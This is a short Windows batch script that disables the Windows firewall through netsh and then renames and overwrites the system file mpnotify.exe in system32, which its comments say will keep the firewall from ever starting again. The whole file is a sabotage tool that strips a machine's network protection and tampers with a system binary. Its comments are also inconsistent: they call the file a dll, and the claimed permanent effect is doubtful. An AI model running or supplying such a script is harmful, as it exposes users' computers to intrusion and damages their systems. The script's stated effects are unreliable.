@echo off
::turns the firewall off
netsh firewall set opmode disable
netsh advfirewall set allprofiles state off

::renames a supporting dll to perma make the firewall not work
echo Renaming mpnotify.dll to prevent firewall from starting...
ren C:\WINDOWS\system32\mpnotify.exe mpnotify1.exe
echo "Killed." > C:\Windows\System32\mpnotify.exe
echo Windows Defender Firewall has been disabled and renamed, preventing it from starting again.
